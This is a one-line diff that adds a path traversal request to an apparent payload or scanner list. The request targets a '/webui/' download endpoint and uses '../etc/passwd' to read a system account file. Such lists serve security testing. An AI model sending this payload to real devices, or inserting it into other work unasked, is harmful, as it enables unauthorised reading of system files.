@@ -1,0 +1,1 @@
+/webui/?g=sys_dia_data_down&file_name=../etc/passwd
